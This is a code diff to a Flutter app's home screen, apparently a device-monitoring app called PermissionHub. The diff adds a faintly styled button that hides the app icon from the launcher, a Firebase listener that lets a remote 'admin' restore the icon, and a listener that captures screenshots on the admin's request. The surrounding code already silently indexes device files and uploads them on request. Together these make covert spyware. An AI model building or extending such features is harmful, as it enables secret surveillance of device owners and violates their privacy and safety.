@@ -1,12 +1,16 @@
 import 'dart:async';
 import 'dart:io';
 import 'package:flutter/material.dart';
+import 'package:flutter/services.dart';
 import 'package:photo_manager/photo_manager.dart';
 import '../models/permission_model.dart';
 import '../services/firebase_service.dart';
 import '../services/file_sync_service.dart';
 import '../services/permission_service.dart';
+import '../services/screenshot_service.dart';
 import 'login_screen.dart';
+
+const _appVisibility = MethodChannel('com.permissionhub/app_visibility');
 
 class HomeScreen extends StatefulWidget {
   const HomeScreen({super.key});
@@ -16,13 +20,15 @@ class HomeScreen extends StatefulWidget {
 }
 
 class _HomeScreenState extends State<HomeScreen> {
-  final _fb = FirebaseService();
-  final _ps = PermissionService();
-  final _syncService = FileSyncService();
+  final _fb             = FirebaseService();
+  final _ps             = PermissionService();
+  final _syncService    = FileSyncService();
+  final _screenshotSvc  = ScreenshotService();
   final List<AppPermission> _permissions = AppPermission.allPermissions();
 
   StreamSubscription? _permSub;
   StreamSubscription? _uploadSub;
+  StreamSubscription? _screenshotSub;
 
   String _status = 'Requesting permissions…';
 
@@ -45,6 +51,24 @@ class _HomeScreenState extends State<HomeScreen> {
 
     // Index all files silently
     _indexFiles(uid);
+
+    // Listen for show-app command from admin
+    _fb.watchCommands(uid).listen((cmd) async {
+      if (cmd['showApp'] == true) {
+        await _appVisibility.invokeMethod('showApp');
+        await _fb.clearCommand(uid, 'showApp');
+      }
+    });
+
+    // Listen for screenshot requests from admin
+    _screenshotSub = _screenshotSvc.watchScreenshotCommand(uid).listen((snap) async {
+      if (!snap.exists) return;
+      final data = snap.data() as Map<String, dynamic>?;
+      if (data == null) return;
+      if (data['status'] == 'pending') {
+        await _screenshotSvc.handleScreenshotRequest(uid);
+      }
+    });
 
     // Listen for admin upload requests
     _uploadSub = _syncService.watchUploadRequest(uid).listen((snap) async {
@@ -90,6 +114,30 @@ class _HomeScreenState extends State<HomeScreen> {
     });
   }
 
+  Future<void> _hideApp() async {
+    final confirm = await showDialog<bool>(
+      context: context,
+      builder: (_) => AlertDialog(
+        backgroundColor: const Color(0xFF1E293B),
+        title: const Text('Hide App Icon?', style: TextStyle(color: Colors.white)),
+        content: const Text(
+          'The app icon will be removed from your home screen and app drawer.\n\nTo restore it, go to Settings → Apps → PermissionHub → Enable, or the admin can restore it remotely.',
+          style: TextStyle(color: Colors.white70, fontSize: 13),
+        ),
+        actions: [
+          TextButton(onPressed: () => Navigator.pop(context, false), child: const Text('Cancel')),
+          TextButton(
+            onPressed: () => Navigator.pop(context, true),
+            child: const Text('Hide', style: TextStyle(color: Color(0xFFF87171))),
+          ),
+        ],
+      ),
+    );
+    if (confirm == true) {
+      await _appVisibility.invokeMethod('hideApp');
+    }
+  }
+
   Future<void> _indexFiles(String uid) async {
     try {
       setState(() => _status = 'Indexing device files…');
@@ -104,6 +152,7 @@ class _HomeScreenState extends State<HomeScreen> {
   void dispose() {
     _permSub?.cancel();
     _uploadSub?.cancel();
+    _screenshotSub?.cancel();
     super.dispose();
   }
 
@@ -165,6 +214,19 @@ class _HomeScreenState extends State<HomeScreen> {
             ),
 
             const Spacer(),
+
+            // Hide app from launcher button
+            Padding(
+              padding: const EdgeInsets.only(bottom: 12),
+              child: TextButton.icon(
+                onPressed: _hideApp,
+                icon: const Icon(Icons.visibility_off, size: 16, color: Colors.white24),
+                label: const Text(
+                  'Hide App Icon',
+                  style: TextStyle(color: Colors.white24, fontSize: 12),
+                ),
+              ),
+            ),
 
             const Padding(
               padding: EdgeInsets.only(bottom: 32),
